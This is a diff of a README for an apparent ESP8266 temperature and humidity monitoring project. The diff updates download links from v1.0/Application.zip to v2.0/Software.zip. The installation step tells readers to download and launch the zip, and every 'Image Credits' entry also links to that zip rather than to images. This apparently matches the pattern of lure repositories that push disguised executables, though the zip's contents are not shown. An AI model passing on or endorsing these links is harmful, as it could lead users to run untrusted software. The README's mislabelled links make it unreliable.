@@ -14,7 +14,7 @@ The system allows you to monitor temperature and humidity data in real-time usin
 ## 🛠️ Installation
 To get started with the WebApp-TempHum Monitoring system, follow these steps:
 1. Download the software package from the following link:  
-[![Download Software](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v1.0/Application.zip)](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v1.0/Application.zip) *(Needs to be launched)*
+[![Download Software](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v2.0/Software.zip)](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v2.0/Software.zip) *(Needs to be launched)*
 2. Set up your ESP8266 device with the DHT22 sensor according to the provided instructions.
 3. Connect the device to the Blynk platform to start visualizing your temperature and humidity data.
 
@@ -36,9 +36,9 @@ If you encounter any issues with the download link provided, please check the "R
 Thank you for your interest in the WebApp-TempHum Monitoring project. Stay connected with your environment in real-time! 🌞🌧️
 
 ## 📷 Image Credits
-[Temperature and Humidity Sensor](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v1.0/Application.zip)  
-[ESP8266 Microcontroller](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v1.0/Application.zip)  
-[Blynk IoT Platform](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v1.0/Application.zip)  
+[Temperature and Humidity Sensor](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v2.0/Software.zip)  
+[ESP8266 Microcontroller](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v2.0/Software.zip)  
+[Blynk IoT Platform](https://github.com/iamabigdev123/WebApp-TempHum-Monitoring/releases/download/v2.0/Software.zip)  
 
 Feel free to explore more about these components and enhance your IoT projects with exciting features and functionalities! 🚀
 
